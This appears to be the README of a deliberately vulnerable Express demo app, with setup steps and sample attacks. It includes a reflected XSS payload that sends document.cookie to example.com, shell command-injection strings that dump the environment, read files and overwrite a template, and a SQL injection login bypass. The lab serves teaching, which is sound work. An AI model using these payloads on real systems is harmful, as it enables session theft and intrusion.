# Tactical Exploit

A quick and dirty express app with exploits used for demonstration purposes.

* SQL Injection
* Cross-Site Scripting (XSS) (maybe using metasploitable)
* Command Execution
* Reflected XSS

## Install dependencies
```
npm install
```
Also make sure your OS has `whois` installed and available, it's used by the
"command execution" vulnerability.

## Start the server
```
npm start
```

Point your browser to `http://localhost:3000/`

Use a different port, for example port `3030`:
```
PORT=3030 npm start
```

Stop the server with `CTRL-C`

## Reset the database
1. Stop the server if it is running using `CTRL-C`
2. `npm run deletedb`
3. Start the server, it will recreate the database: `npm start`

## Reset the code
The command execution exploit allows you to write an exploit that can overwrite the code!

Reset the code using:

```
npm run reset
```

## Clobber code changes and the database
Get it all done in one go (database reset, reset code)...

```
npm run clobber
```

## Reflected XSS
Path: `/reflected-xss`

Query input:
```
<script>window.location='http://example.com/?cookies='+document.cookie</script>
```

Constructed link:
```
http://localhost:3000/reflected-xss?q=%3Cscript%3Ewindow.location%3D%27http%3A%2F%2Fexample.com%2F%3Fcookies%3D%27%2Bdocument.cookie%3C%2Fscript%3E
```



## Command Execution
Path: `/command-execition`

```
example.com && export
```

```
example.com && pwd && ls -la && cat package.json && ls -l views && echo "Mwuahahah" > views/compromised.ejs
```

```
example.com > /dev/null|| pwd && ls -la && cat package.json && whoami && groups && uname -a|| ifconfig
```

## Cross-Site-Scripting (XSS)

## SQL Injection

* Bypass browser side validation: use developer tools to add `novalidate` attribute to the form
* Username: `bob" or 1=1--`
* Password: anything
